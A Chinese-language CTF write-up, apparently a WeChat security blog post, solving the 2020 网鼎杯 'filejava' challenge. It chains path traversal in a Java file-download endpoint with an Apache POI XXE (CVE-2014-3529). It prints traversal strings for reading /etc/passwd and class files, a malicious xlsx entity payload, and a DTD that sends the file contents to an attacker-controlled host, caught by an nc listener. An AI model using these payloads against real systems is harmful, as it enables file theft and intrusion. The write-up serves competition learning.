---
title: flag{网鼎杯之java代码审计入门}  网鼎杯 2020 青龙组 --filejava
url: https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247487748&idx=1&sn=b65c2241bccb13d3b3e93258ad2bf618&chksm=fb029c5ccc75154ad892f7dcfda96cab3e8d4da8b122341f6d3209a13f363ff0e3ec6878d0c7&scene=58&subscene=0#rd
source: 黑伞安全
date: 2023-08-01
fetch_date: 2025-10-06T17:02:36.816626
---

# flag{网鼎杯之java代码审计入门}  网鼎杯 2020 青龙组 --filejava

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSFn5ysdkcsxWObZ3aTvhicyQO24iazVJn3NsT1LZMmgNf4ibtrWfoQeHWA/0?wx_fmt=jpeg)

# flag{网鼎杯之java代码审计入门} 网鼎杯 2020 青龙组 --filejava

sule01u

黑伞安全

01

—

赛题截图

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSK8unXF776WPqxEeQ774yBQ3ozq48Fic59c2cKMxZPUNd3vsJntCZWEQ/640?wx_fmt=png)

02

—

接口测试

• 我们先上传文件抓包，发送到repeter

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSiabibTQHazusCLMw62SdlkLORWf9zPIaVZtNzgHQPgAmj5JrTq8QIQAQ/640?wx_fmt=png)响应如下![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSpHWoZGy9Gsuq1b20cnfOJa5obiclXVMCJaj8icaQpJ87FK8j0eILt4zg/640?wx_fmt=png)

• 我们使用下载接口去下载一个不存在的文件，回显“资源被删除”

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSg2mQkodBRy9AJnQnXhGibXfkSGx5AOh4ia3b1k5lQGBLGAln5g5ia8w8Q/640?wx_fmt=png)

03

—

任意文件下载验证

•**测试一下下载文件夹**

暴露了上传文件夹的绝对路径

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSxSQBiaESJbB2L04Ifcy8SicZ02ITvyjllYYrk7Hmia3tRag0uASibgJG2w/640?wx_fmt=png)

我们来推测下/etc/passwd文件路径

```
1. 上传文件的路径为：/usr/local/tomcat/webapps/file_in_java/WEB-INF/upload/0/10/上传文件名2. 那/etc目录是跟/usr一层级的,上图有九层目录，应该回退九层：/usr/local/tomcat/webapps/file_in_java/WEB-INF/upload/0/10/../../../../../../../../../etc/passwd3. 则我们下载文件的参数应该为: ../../../../../../../../../etc/passwd
```

根据上面推理构造请求，成功获取/etc/passwd文件内容；yeah！！！

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSl2eRXrluGfOa2yp3iaEUUokJcAMJnrwdG69HNtBa1XeiaqyV9UqpJOwA/640?wx_fmt=png)

**有同学问了，拿到了/etc/passwd的文件内容有什么用，怎么才能getshell啊**

通过上面的一些测试，我们可以知道任意文件下载的漏洞存在该系统, 那我们只能看看能不能拿到源码审计看看了

• **通过暴露的上传文件存储的路径得知web服务器为tomcat**

```
/usr/local/tomcat/webapps/file_in_java/WEB-INF/upload/0/10/
```

**• 前置知识**

Tomcat的web.xml是一个XML文件，用于配置Web应用程序的部署信息和其他相关配置。它通常位于Web应用程序的WEB-INF目录下。web.xml文件中包含了大量的配置信息，其中最重要的是Web应用程序的servlet、过滤器和监听器等组件的配置，是tomcat的核心配置文件。

**• 读取web.xml文件，可以看到有三个接口类**

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSiax3tiaic3yqX2y4VtjicEJ2OrGs35cdvL3DWxiamJ6kmPvia0oQombnnhwQ/640?wx_fmt=png)

**• 根据tomca结构，我们知道class文件都在WEB-INF目录:**

构造路径../../../../../../../../../../usr/local/tomcat/webapps/file\_in\_java/WEB-INF/classes/具体类路径,成功获取文件内容

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSrzBhGaHyhmDWauvVDTzCKZbwSI6yLrdicIQco0dqxWmhVCVU5muOn1A/640?wx_fmt=png)

**•浏览器通过下载三个类文件,如下图所示**![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hS8YrXxC4uQY7hSPHiaByqBEYqgkIFQWfABOmIG8WdF4Bf3XdzkdzQPMA/640?wx_fmt=png)

04

—

代码审计

**idea打开这几个class文件,idea可以直接反编译**

****• 源代码审计****

**• 查找flag关键词，文件名只要包含flag字符就会被ban**![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSmkibqPibowswxcZOUHvOh06ZicXKhTmSYu4sCE931HRK3009QHicqFM8lA/640?wx_fmt=png)

**• 看看其他文件有没有能够下手的地方**

ListFileServlet.class文件，只是返回保存的文件名作用，应该是通过上传接口完成之后调用的

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSdapnvTCqRQtISgc4dSTbcXVU0CFWAz8OKdH6pPEv3Ffks7hnTUFmfw/640?wx_fmt=png)

仅剩UploadServlet接口了，发现可疑的一段代码，里面提到了xlsx文件格式，好像做了不一样的处理。

让chatgpt给我们解释一下代码啥意思！

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSVpo18vTlzCVOklypYnTrPSZgwVuGcwNUa0hc2U5WJMdZPM65APqQVg/640?wx_fmt=png)

**• 首先说一句chatgpt真香啊!!!**

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hS7ibVL29v4nibBbMp7znBW37cgr5FibgYfQ7icZAuWfwHVGp7eZICMwdtDg/640?wx_fmt=png)

关注图片标红部分，意思是说我们要通过一个excel-xx.xlsx文件利用apache poi库搞事情？

05

—

### Apache POI库漏洞利用

Apache POI 简介是用Java编写的免费开源的跨平台的 Java API，Apache POI提供API给Java程式对Microsoft Office（Excel、WORD、PowerPoint、Visio等）格式档案读和写的功能

即然用到了POI库，那我们看看这个库是否有漏洞存在！代码中给出的POI库版本为3.10；是否有漏洞，**google一下你就知道。**

```
CVE-2014-3529   apache poi 在3.10.1之前存在XXE漏洞
```

****•**复现CVE-2014-3529**

**1. 准备payload文件**

新建一个excel文件并解压（linux unzip命令即可解压 ‘.xlsx’ 文件）

```
mkdir tmp_excel       //新建一个目录存放解压后的文件目录            touch 1.xlsx           //新建一个excel文件unzip 1.xlsx  -d tmp_excel      //解压到指定目录              cd tmp_excel                    //进入目录              ls                              //查看解压后的文件
```

解压后的效果如下图所示： ![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSIwBRZUF0dbCoCgMiciaEXX6cqtW9YmME0EzloFsyCNhnibHZY4uledNtg/640?wx_fmt=png)

解压后在 [Content\_Types].xml 文件中添加payload，(在第一句和第二句中间添加下面给出的payload)

payload解释

代码中的实体 remote 定义了一个外部实体，其系统标识符（System Identifier）为 "http://your-remote-ip/file.dtd"。然后，通过 %remote; 引用了这个实体，将其包含到当前XML文档中。然后通过该外部实体 %int; 和 %send; 执行一些操作

```
 <!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://you-remote-ip/file.dtd"> %remote;%int;%send; ]>
```

[Content\_Types].xml 文件添加payload后效果如图所示

![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSPJuAxfk4p8Lp1O2O2cjqgsial8U60ibdiaiarGmJUA8Vrw9Hg7ib0GQBMrw/640?wx_fmt=png)

打包回xlsx文件格式,根据前面的代码分析，根据前面代码审计我们还记得文件名得命名为excel-x.xlsx

```
zip excel-1.xlsx ./*
```

**2. 远程服务器准备一个file.dtd文件**

```
<!ENTITY % file SYSTEM "file:///flag"><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://your-ip:port?popko=%file;'>">
```

**dtd文件解释**

a. %file 定义了一个实体，通过 file:///flag 指定为一个文件路径。读取本地文件系统上的 flag 文件。

b. %int 定义了另一个实体，通过 http://your-ip:port?popko=%file; 将读取到的文件内容发送给指定的IP地址和端口，我们通过nc在该ip所在服务器上监听这里指定的端口。

**文件最终想要实现的效果是读取 flag 文件，并将其内容发送到指定的服务器上。**

**3. 远程服务器80端口启动http服务，使通过http://your-remote-ip/file.dtd能访问到file.dtd资源**

```
python3 -m http.server 80
```

**4. nc监听端口，准备接受flag文件内容**

```
nc -lvvnp port        //port为你file.dtd里指定的端口
```

**5. 上传xlsx文件测试**![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSRHkIM8lEHrZqZqZG4CzicTwzVySjrC9B9ibzHxRddlKRvVNiarnW5cTIg/640?wx_fmt=png)http服务成功接收到file.dtd的请求![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSvcSQ8efeJIk6x27I1VdW3r9wCaicvMCkNEM7tLSeHcWj8ViboiamJdFqw/640?wx_fmt=png)nc成功收到flag文件的内容 ![](https://mmbiz.qpic.cn/mmbiz_png/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSykdOvMYYXXVGm9YmVicCMibaTKpC2YfQf2C05BoQicEib7iaQuPibr5QN7wQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/apmYTPAKhlXsaTwgAiahTwglRCibSkv0hSOqCAlluwXy1cfpLh2W3UNh1P4wcBm0VljdloIHhRibficsTgOIqLnbPA/640?wx_fmt=gif)

06

—

### 总结

• **任意文件下载(读取)**

• **Apache POI XXE**

**脚踏实地的每天进步一点点，不跟别人相比，只超越自己就够了。**

**欢迎关注不懂安全 ⬇️**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

黑伞安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过